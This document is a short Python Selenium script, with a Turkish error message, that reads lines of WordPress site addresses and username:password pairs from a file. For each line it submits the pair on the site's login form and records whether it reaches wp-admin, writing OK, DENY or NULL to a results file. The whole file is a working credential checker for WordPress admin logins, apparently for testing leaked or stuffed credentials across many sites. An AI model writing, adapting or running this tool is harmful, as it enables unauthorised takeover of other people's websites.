from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import WebDriverException, TimeoutException
import time

def check_credentials(line):
    parts = line.split()
    if len(parts) == 2:
        site, credentials = parts
        username, password = credentials.split(":")

        options = webdriver.ChromeOptions() #set ur webdriver path
        options.add_argument("--start-maximized")

        driver = webdriver.Chrome(options=options)

        try:
            driver.get(site)

            wait = WebDriverWait(driver, 2)

            username_field = wait.until(EC.presence_of_element_located((By.ID, "user_login")))
            username_field.send_keys(username)

            password_field = driver.find_element(By.ID, "user_pass")
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)

            try:
                wait.until(EC.url_contains("wp-admin"))
                return "OK"
            except TimeoutException:
                return "DENY"

        except (WebDriverException, TimeoutException) as e:
            return "NULL"

        finally:
            driver.quit()

    else:
        return f"Geçersiz giriş formatı: {line}"

def main():
    with open("credentials.txt", "r", encoding='utf-8') as file:
        with open("response.txt", "w", encoding='utf-8') as output_file:
            for line in file:
                line = line.strip()
                if line:
                    result = check_credentials(line)
                    site = line.split()[0]
                    output_file.write(f"{site} -> {result}\n")

if __name__ == "__main__":
    main()
